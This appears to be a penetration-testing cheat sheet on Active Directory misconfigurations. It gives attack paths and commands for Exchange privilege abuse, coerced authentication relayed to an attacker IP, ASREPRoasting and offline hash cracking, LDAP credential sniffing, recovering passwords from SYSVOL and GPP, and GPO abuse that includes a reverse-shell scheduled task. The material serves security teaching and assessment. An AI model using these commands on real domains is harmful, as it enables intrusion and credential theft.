# Miscellaneous Active Directory Misconfigurations

## Exchange-Related Privileges

Standard Microsoft Exchange installations often grant significant privileges to specific groups and servers, creating multiple escalation paths.

### Privileged Exchange Groups

|Group|Security Implication|Attack Path|
|:--|:--|:--|
|**Exchange Windows Permissions**|Has **Write DACL** rights on the domain object.|Modify domain DACL to grant an attacker account **DCSync** privileges.|
|**Organization Management**|Effectively "Domain Admins" of Exchange; has full control over the **Microsoft Exchange Security Groups** OU.|Access all domain mailboxes or add accounts to the **Exchange Windows Permissions** group,.|
|**Account Operators**|Can manage user accounts.|Add accounts to the **Exchange Windows Permissions** group.|

### Exchange Server Compromise

- **Context:** Compromising an Exchange server often leads directly to **Domain Admin** privileges.
- **Credential Harvesting:** Users logging into **Outlook Web Access (OWA)** cause Exchange to cache credentials in memory.
- **Implication:** Dumping memory on an Exchange server can yield hundreds of cleartext credentials or NTLM hashes.

---

## Forced Authentication Attacks

These techniques force a service running as **SYSTEM** to authenticate to an attacker-controlled host, enabling NTLM relaying to LDAP or other services,.

### 1. PrivExchange

- **When to use:** When you have an authenticated domain user account with a mailbox,.
- **Why it matters:** Exploits the **PushSubscription** feature to force the Exchange server to authenticate over HTTP.
- **Outcome:** Relay to LDAP to dump the **NTDS database** or authenticate to other domain hosts.

### 2. Printer Bug (MS-RPRN)

- **When to use:** To relay authentication to LDAP for **DCSync** rights or **Resource-Based Constrained Delegation (RBCD)**.
- **Scenario:** Can be used to attack across **forest trusts** if the target has Unconstrained Delegation enabled.

**Operational Workflow:**

1. **Enumerate:** Identify if the Print Spooler service is active on the target.
    
    ```
    # Check vulnerability status using SecurityAssessment.ps1
    Import-Module .\SecurityAssessment.ps1
    Get-SpoolStatus -ComputerName <TARGET_IP_OR_HOSTNAME>
    ```
    
2. **Trigger:** Use the `RpcRemoteFindFirstPrinterChangeNotificationEx` method to force the server to authenticate to `<ATTACK_IP>` over SMB.

---

## Kerberos Attacks

### 1. ASREPRoasting

- **When to use:** When an account has **"Do not require Kerberos pre-authentication"** (`DONT_REQ_PREAUTH`) enabled.
- **Why it matters:** Any user can request an AS-REP for these accounts. The response is encrypted with the user's password and can be cracked offline,.

**Execution Workflow:**

1. **Enumerate affected users:**
    
    ```
    # Find users with DONT_REQ_PREAUTH via PowerView
    Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol
    ```
    
2. **Retrieve Hash:**
    
    ```
    # Using Rubeus (Windows) - use /nowrap for Hashcat compatibility
    .\Rubeus.exe asreproast /user:<USERNAME> /nowrap /format:hashcat
    ```
    
    ```
    # Using Impacket (Linux)
    GetNPUsers.py <DOMAIN>/ -dc-ip <TARGET_IP> -no-pass -usersfile <USER_LIST>
    ```
    
3. **Crack Offline:**
    
    ```
    hashcat -m 18200 <HASH_FILE> <WORDLIST>
    ```
    

### 2. MS14-068

- **Technique:** Forging a **Privilege Attribute Certificate (PAC)**,.
- **Impact:** Allows a standard domain user to be treated as a **Domain Admin** by the KDC,.

---

## Information Disclosure & DNS Enumeration

### Active Directory DNS (adidnsdump)

- **When to use:** When hostnames are non-descriptive (e.g., `SRV01934`) and you need to identify high-value targets.
- **Why it matters:** By default, all domain users can list child objects of a DNS zone. This reveals "hidden" records like `JENKINS` or `LOGISTICS`.

|Command|Goal|
|:--|:--|
|`adidnsdump -u <DOMAIN>\<USERNAME> ldap://<TARGET_IP>`|List all DNS records in the domain.|
|`adidnsdump -u <DOMAIN>\<USERNAME> ldap://<TARGET_IP> -r`|Perform A queries to resolve unknown records to IPs.|

### LDAP Credential Sniffing

- **Scenario:** Printers or applications with web admin consoles often use LDAP for authentication.
- **Technique:** Use a "Test Connection" function in the console, changing the LDAP IP to `<ATTACK_IP>`.
- **Outcome:** Listen on port **389** (e.g., via `netcat`) to capture credentials, which are often sent in **cleartext**.

---

## Credentials in AD Objects & SYSVOL

### Dangerous AD Object Settings

|Setting|Security Impact|
|:--|:--|
|**PASSWD_NOTREQD**|User is not subject to password length policies; password could be **blank**.|
|**Description/Notes Field**|Admins frequently store temporary or service passwords in these searchable fields.|

**Enumeration:**

```
# Search description fields for passwords
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}

# Identify accounts where passwords are not required
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### SYSVOL & Group Policy Preferences (GPP)

- **SYSVOL Scripts:** Globally readable directory (`\\<DOMAIN_CONTROLLER>\SYSVOL\<DOMAIN>\scripts`) often contains scripts with hardcoded passwords.
- **GPP Passwords:** Older GPOs store AES-256 encrypted passwords in `Groups.xml`. The decryption key is publicly known,.

**Exploitation:**

```
# Decrypt a cpassword string manually
gpp-decrypt <ENCRYPTED_PASSWORD>

# Automate retrieval of GPP and Autologon credentials via CrackMapExec
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M gpp_password
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M gpp_autologin
```

---

## Group Policy Object (GPO) Abuse

Rights such as **WriteProperty**, **WriteDacl**, or **GenericWrite** over a GPO allow an attacker to control any user or computer in the linked OU,.

### Methodology

1. **Identify Vulnerable ACLs:** Find GPOs where **Domain Users** have write permissions,.
    
    ```
    $sid=Convert-NameToSid "Domain Users"
    Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
    ```
    
2. **Verify Impact:** Use BloodHound to identify the **Affected Objects** (computers/users) linked to the GPO.
3. **Execute:** Use `SharpGPOAbuse` to perform actions such as:
    - Adding a user to the **Local Admins** group.
    - Creating an **Immediate Scheduled Task** for a reverse shell.
    - Configuring **Startup Scripts**.

**Risk Note:** Changes affect **all** computers within the OU linked to the GPO. Avoid mass exposure in large environments.